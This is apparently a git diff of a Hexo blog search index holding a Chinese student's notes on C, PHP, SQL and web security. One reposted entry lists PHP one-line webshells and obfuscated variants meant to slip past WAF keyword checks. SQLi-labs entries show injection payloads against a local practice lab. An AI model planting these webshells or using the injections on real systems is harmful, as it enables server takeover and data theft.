@@ -1,20 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>C语言求余问题</title>
-    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
-    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
-<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
-<p>a，b，c，d</p>
-<p>b=a/100；</p>
-<p>c=a/10%10;</p>
-<p>d=a%10;</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C语言注</title>
     <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
     <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
@@ -140,6 +126,20 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言求余问题</title>
+    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
+    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
+<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
+<p>a，b，c，d</p>
+<p>b=a/100；</p>
+<p>c=a/10%10;</p>
+<p>d=a%10;</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>函数递归</title>
     <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
     <content><![CDATA[<p> 递归思想</p>
@@ -179,23 +179,6 @@
       </tags>
   </entry>
   <entry>
-    <title>指针</title>
-    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
-    <content><![CDATA[<p> 指针和指针变量</p>
-<p>char *pa;//  定义一个指向字符型的指针变量；</p>
-<p>int *pb;//   定义一个指向整型的指针变量；</p>
-<p>取地址运算符  &amp;</p>
-<p>取值运算符   *</p>
-<p>未理解的</p>
-<p>（now，a）</p>
-<p>( the addr of a is)</p>
-<p>避免访问未初始化的指针</p>
-]]></content>
-      <tags>
-        <tag>指针</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>占用内存有关</title>
     <url>/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
     <content><![CDATA[<p>让整数占用更少的内存可以在 int 前边加 short，让整数占用更多的内存可以在 int 前边加 long，例如：</p>
@@ -227,6 +210,23 @@
 ]]></content>
       <tags>
         <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指针</title>
+    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
+    <content><![CDATA[<p> 指针和指针变量</p>
+<p>char *pa;//  定义一个指向字符型的指针变量；</p>
+<p>int *pb;//   定义一个指向整型的指针变量；</p>
+<p>取地址运算符  &amp;</p>
+<p>取值运算符   *</p>
+<p>未理解的</p>
+<p>（now，a）</p>
+<p>( the addr of a is)</p>
+<p>避免访问未初始化的指针</p>
+]]></content>
+      <tags>
+        <tag>指针</tag>
       </tags>
   </entry>
   <entry>
@@ -408,59 +408,6 @@ echo $c;
       </tags>
   </entry>
   <entry>
-    <title>php木马</title>
-    <url>/2021/02/19/php/php%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<p>PHP一句话木马：<br>   \1. eval():   <?php @eval($_POST['hacker']); ?>   eval函数将接受的字符串当做代码执行</p>
-<p>   \2. assert(): 用法和 eval()一样</p>
-<p>   \3. preg_replace(): <?php @preg_replace("/abcd/e",$_POST['hacker'],"abcdefg"); ?>   preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p>
-<p>   \4. create_function(): <?php
-                 $newfun = create_function('$hacker', 'echo $hacker;');
-                 $newfun('woaini');
-             ?><br>             创建了一个匿名函数，并返回了一个独一无二的函数名</p>
-<p>   \5. call_user_func(): <?php @call_user_func(eval,$_POST['hacker']); ?>   函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数<br>    call_user_func_array(): 方法同上，只是第二个参数要是一个数组，作为第一个参数的参数</p>
-<pre><code>还有一些文件操作函数，比如 file_put_contents函数： &lt;?php $test=&#39;一句话木马&#39;; file_get_contents(&quot;文件名&quot;, $test); ?&gt;
-     此函数把一个字符串写入一个文件中</code></pre>
-<p>怎么让一句话木马绕过 WAF：<br>   WAF通常会以关键字判断是否为一句话木马，所以要将一句话木马变形使用，从而绕过 waf：<br>     \1. php变量函数：<br>       <?php
-         $a = "assert";
-         $a($_POST['hacker']);
-       ?></p>
-<p>​     \2. php可变变量：<br>​       <?php
-​         $b = "assert";
-​         $a = 'b';
-​         $$a($_POST['hacker']);
-​       ?></p>
-<p>​     \3. str_replace函数：<br>​       <?php
-​         $a = str_replace("b", "", "absbsbebrbt");
-​         $a($_POST['hacker']);
-​       ?><br>​       此函数用于将第三个参数中的第一个参数替换为第二个参数</p>
-<p>​     \4. base64_decode 函数：<br>​       <?php
-​         $a = base64_decode("YXNzZXJ0");
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>​     \5. 使用”.”连接字符串：<br>​       <?php
-​         $b = "a"."ss";
-​         $c = "er"."t";
-​         $a = $b.$c;
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>​     \6. pares_str函数：<br>​       <?php
-​         $str = "a=assert";
-​         parse_str($str);/parse_str("a=assert");
-​         $a($_POST['hacker']);
-​       ?></p>
-<p>最后举个例子：<br>       <?php
-         function fun(){
-           return $_POST['hacker'];
-         }
-         @preg_replace("/test/e", fun(), "testtesttest");
-       ?></p>
-<p>转载：<a href="https://bbs.ichunqiu.com/thread-26365-1-1.html">https://bbs.ichunqiu.com/thread-26365-1-1.html</a></p>
-]]></content>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php语法</title>
     <url>/2020/11/02/php/php%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<ol>
@@ -574,6 +521,86 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php木马</title>
+    <url>/2021/02/19/php/php%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<p>PHP一句话木马：<br>   \1. eval():   <?php @eval($_POST['hacker']); ?>   eval函数将接受的字符串当做代码执行</p>
+<p>   \2. assert(): 用法和 eval()一样</p>
+<p>   \3. preg_replace(): <?php @preg_replace("/abcd/e",$_POST['hacker'],"abcdefg"); ?>   preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p>
+<p>   \4. create_function(): <?php
+                 $newfun = create_function('$hacker', 'echo $hacker;');
+                 $newfun('woaini');
+             ?><br>             创建了一个匿名函数，并返回了一个独一无二的函数名</p>
+<p>   \5. call_user_func(): <?php @call_user_func(eval,$_POST['hacker']); ?>   函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数<br>    call_user_func_array(): 方法同上，只是第二个参数要是一个数组，作为第一个参数的参数</p>
+<pre><code>还有一些文件操作函数，比如 file_put_contents函数： &lt;?php $test=&#39;一句话木马&#39;; file_get_contents(&quot;文件名&quot;, $test); ?&gt;
+     此函数把一个字符串写入一个文件中</code></pre>
+<p>怎么让一句话木马绕过 WAF：<br>   WAF通常会以关键字判断是否为一句话木马，所以要将一句话木马变形使用，从而绕过 waf：<br>     \1. php变量函数：<br>       <?php
+         $a = "assert";
+         $a($_POST['hacker']);
+       ?></p>
+<p>​     \2. php可变变量：<br>​       <?php
+​         $b = "assert";
+​         $a = 'b';
+​         $$a($_POST['hacker']);
+​       ?></p>
+<p>​     \3. str_replace函数：<br>​       <?php
+​         $a = str_replace("b", "", "absbsbebrbt");
+​         $a($_POST['hacker']);
+​       ?><br>​       此函数用于将第三个参数中的第一个参数替换为第二个参数</p>
+<p>​     \4. base64_decode 函数：<br>​       <?php
+​         $a = base64_decode("YXNzZXJ0");
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>​     \5. 使用”.”连接字符串：<br>​       <?php
+​         $b = "a"."ss";
+​         $c = "er"."t";
+​         $a = $b.$c;
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>​     \6. pares_str函数：<br>​       <?php
+​         $str = "a=assert";
+​         parse_str($str);/parse_str("a=assert");
+​         $a($_POST['hacker']);
+​       ?></p>
+<p>最后举个例子：<br>       <?php
+         function fun(){
+           return $_POST['hacker'];
+         }
+         @preg_replace("/test/e", fun(), "testtesttest");
+       ?></p>
+<p>转载：<a href="https://bbs.ichunqiu.com/thread-26365-1-1.html">https://bbs.ichunqiu.com/thread-26365-1-1.html</a></p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>11-20</title>
+    <url>/2021/02/18/sql/11-20/</url>
+    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
+<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
+<p>但是#改成–+却不行</p>
+<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
+<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
+<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
+<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
+<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
+<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
+<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
+]]></content>
+      <tags>
+        <tag>sql靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -728,33 +755,6 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>11-20</title>
-    <url>/2021/02/18/sql/11-20/</url>
-    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
-<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
-<p>但是#改成–+却不行</p>
-<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
-<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
-<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
-<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
-<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
-<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
-<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
-<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
-]]></content>
-      <tags>
-        <tag>sql靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mysql</title>
     <url>/2020/12/01/sql/Mysql/</url>
     <content><![CDATA[<p>  关于MySQL的安装</p>
@@ -809,6 +809,17 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
+    <title>进阶区</title>
+    <url>/2021/02/05/web/9-12/</url>
+    <content><![CDATA[<h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>老套路</p>
+<h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>访问index.php,跳转后回到页面，考虑使用抓包，进行repeater，go后在头部看到 flag。</p>
+<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p>神奇的PHPv5框架存在漏洞利用，采用路径更改（像Linux指令）进行访问</p>
+]]></content>
+      <tags>
+        <tag>攻防世界_web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>增删改查</title>
     <url>/2021/02/14/sql/%E5%A2%9E%E5%88%A0%E6%9F%A5%E6%94%B9/</url>
     <content><![CDATA[<p>/<em>注1：原则上SQL关键字应该大写，但小写也没问题</em>/</p>
@@ -829,34 +840,6 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图片马</title>
-    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
-    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
-<p>  如 1.jpg与 2.php同在桌面，则：</p>
-<p>  cd   desktop</p>
-<ol start="2">
-<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
-<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
-<p>​    </p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>进阶区</title>
-    <url>/2021/02/05/web/9-12/</url>
-    <content><![CDATA[<h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>老套路</p>
-<h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>访问index.php,跳转后回到页面，考虑使用抓包，进行repeater，go后在头部看到 flag。</p>
-<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p>神奇的PHPv5框架存在漏洞利用，采用路径更改（像Linux指令）进行访问</p>
-]]></content>
-      <tags>
-        <tag>攻防世界_web</tag>
       </tags>
   </entry>
   <entry>
@@ -977,51 +960,6 @@ cookie信息盗取可以直接登录-->]]></content>
       </tags>
   </entry>
   <entry>
-    <title>端口</title>
-    <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
-    <content><![CDATA[<p>80端口，443端口</p>
-<p>80端口是为<a href="https://baike.baidu.com/item/HTTP">HTTP</a>[超文本传输协议]开放的，此为上网冲浪使用次数最多的协议，主要用于WWW（World Wide Web）即万维网传输信息的协议。（来自百度）</p>
-<p>可以通过HTTP地址（即常说的“网址”）加“: 80”来访问网站，因为浏览网页服务默认的<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7/10883658">端口号</a>都是80，因此只需输入网址即可，不用输入“: 80”了。(来自百度)</p>
-<p>443端口：https默认调用443端口，向443发请求，80端口拿数据；传输时注意加密算法，加密算法需要分享，</p>
-<p>1.浏览器提交支持的加密算法列表</p>
-<p>2.服务器收到请求，下发一个加密算法</p>
-<p>3.摘要算法，将一段数据加密得到密文（摘要）</p>
-<p>签名：对于一个内容，认可数据，认证机制，认可摘要（防篡改）</p>
-<p>原本的数据+摘要+算法——&gt;数据防篡改——&gt;真正包含了签名的</p>
-]]></content>
-      <tags>
-        <tag>https协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>other 一些 information</title>
-    <url>/2020/11/05/x/FAFU%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E4%BC%9A/</url>
-    <content><![CDATA[<h4 id="fafu学长讲课记录的：（捂脸，只有这么少）"><a href="#fafu学长讲课记录的：（捂脸，只有这么少）" class="headerlink" title="fafu学长讲课记录的：（捂脸，只有这么少）"></a>fafu学长讲课记录的：（捂脸，只有这么少）</h4><p>Web安全</p>
-<p>crypto：矩阵，数论，密码学</p>
-<p>dvwa平台</p>
-<h5 id="html的常见标签"><a href="#html的常见标签" class="headerlink" title="html的常见标签"></a>html的常见标签</h5><ul>
-<li><ul>
-<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
-<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
-<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
-<li><strong><title></title></strong> 元素描述了文档的标题</li>
-<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
-<li><strong><h1></h1></strong> 元素定义一个大标题</li>
-<li><strong><p></p></strong> 元素定义一个段落</li>
-<li>HTML      标签通常是<em>成对出现</em>的，比如 <b> 和      </b></li>
-<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
-</ul>
-</li>
-</ul>
-<h5 id="HTML-网页结构"><a href="#HTML-网页结构" class="headerlink" title="HTML 网页结构"></a><strong>HTML 网页结构</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一个可视化的HTML页面结构：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;这是一个标题&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​               </p>
-]]></content>
-      <tags>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>goktech</title>
     <url>/2021/01/31/x/goktech/</url>
     <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
@@ -1068,6 +1006,51 @@ cookie信息盗取可以直接登录-->]]></content>
       </tags>
   </entry>
   <entry>
+    <title>端口</title>
+    <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
+    <content><![CDATA[<p>80端口，443端口</p>
+<p>80端口是为<a href="https://baike.baidu.com/item/HTTP">HTTP</a>[超文本传输协议]开放的，此为上网冲浪使用次数最多的协议，主要用于WWW（World Wide Web）即万维网传输信息的协议。（来自百度）</p>
+<p>可以通过HTTP地址（即常说的“网址”）加“: 80”来访问网站，因为浏览网页服务默认的<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7/10883658">端口号</a>都是80，因此只需输入网址即可，不用输入“: 80”了。(来自百度)</p>
+<p>443端口：https默认调用443端口，向443发请求，80端口拿数据；传输时注意加密算法，加密算法需要分享，</p>
+<p>1.浏览器提交支持的加密算法列表</p>
+<p>2.服务器收到请求，下发一个加密算法</p>
+<p>3.摘要算法，将一段数据加密得到密文（摘要）</p>
+<p>签名：对于一个内容，认可数据，认证机制，认可摘要（防篡改）</p>
+<p>原本的数据+摘要+算法——&gt;数据防篡改——&gt;真正包含了签名的</p>
+]]></content>
+      <tags>
+        <tag>https协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>other 一些 information</title>
+    <url>/2020/11/05/x/FAFU%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E4%BC%9A/</url>
+    <content><![CDATA[<h4 id="fafu学长讲课记录的：（捂脸，只有这么少）"><a href="#fafu学长讲课记录的：（捂脸，只有这么少）" class="headerlink" title="fafu学长讲课记录的：（捂脸，只有这么少）"></a>fafu学长讲课记录的：（捂脸，只有这么少）</h4><p>Web安全</p>
+<p>crypto：矩阵，数论，密码学</p>
+<p>dvwa平台</p>
+<h5 id="html的常见标签"><a href="#html的常见标签" class="headerlink" title="html的常见标签"></a>html的常见标签</h5><ul>
+<li><ul>
+<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
+<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
+<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
+<li><strong><title></title></strong> 元素描述了文档的标题</li>
+<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
+<li><strong><h1></h1></strong> 元素定义一个大标题</li>
+<li><strong><p></p></strong> 元素定义一个段落</li>
+<li>HTML      标签通常是<em>成对出现</em>的，比如 <b> 和      </b></li>
+<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
+</ul>
+</li>
+</ul>
+<h5 id="HTML-网页结构"><a href="#HTML-网页结构" class="headerlink" title="HTML 网页结构"></a><strong>HTML 网页结构</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一个可视化的HTML页面结构：</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;页面标题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;这是一个标题&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​               </p>
+]]></content>
+      <tags>
+        <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/11/05/x/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -1084,30 +1067,6 @@ cookie信息盗取可以直接登录-->]]></content>
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>博客解疑</title>
-    <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
-    <content><![CDATA[<h4 id="当输入hexo-s-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-s-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo s -g发布博文并预览时出现下面的提示："></a>当输入hexo s -g发布博文并预览时出现下面的提示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
-<h4 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo s 时出现报错"></a>hexo s 时出现报错</h4><p>Port 4000 has been used. Try other port instead.</p>
-<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
-<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #端口号随意，默认是4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>
-
-<h4 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h4><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
-<p>重新看了下csdn上一篇好文章</p>
-<p>附上链接：</p>
